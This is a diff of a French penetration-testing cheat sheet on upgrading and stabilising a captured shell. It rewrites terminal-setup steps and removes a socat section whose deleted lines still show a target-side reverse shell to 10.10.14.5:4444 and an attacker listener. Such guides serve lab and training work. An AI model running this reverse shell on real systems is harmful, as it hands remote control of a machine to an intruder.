@@ -337,39 +337,17 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 stty raw -echo; fg
 
 # 4. Réinitialiser le terminal
-reset
+entree
 
 # 5. Configurer les variables d'environnement
 export SHELL=bash
 export TERM=xterm-256color
+
+ #optionnel
 stty rows 38 columns 116
-```
-
-**Explication** :
-- `python3 -c 'import pty;pty.spawn("/bin/bash")'` : Crée un pseudo-terminal
-- `Ctrl+Z` : Met le processus en arrière-plan
-- `stty raw -echo` : Configure le terminal pour transmettre toutes les touches
-- `fg` : Ramène le processus au premier plan
-- `reset` : Réinitialise le terminal
-- `export TERM=xterm-256color` : Active les couleurs
-- `stty rows X columns Y` : Configure la taille du terminal
-
-### Méthode 3 : Socat
-
-**Sur l'attaquant** :
-```bash
-# Générer un certificat SSL (optionnel)
-openssl req -x509 -newkey rsa:4096 -keyout shell.key -out shell.crt -days 365 -nodes
-cat shell.key shell.crt > shell.pem
-
-# Listener socat avec TTY
-socat file:`tty`,raw,echo=0 tcp-listen:4444
-```
-
-**Sur la cible** :
-```bash
-# Si socat est disponible
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
+alias ls='ls --color=auto'
+alias grep='grep --color=auto'
+export LS_COLORS='di=1;36:fi=0:ln=1;35:ex=1;32'
 ```
 
 ### Méthode 4 : Script
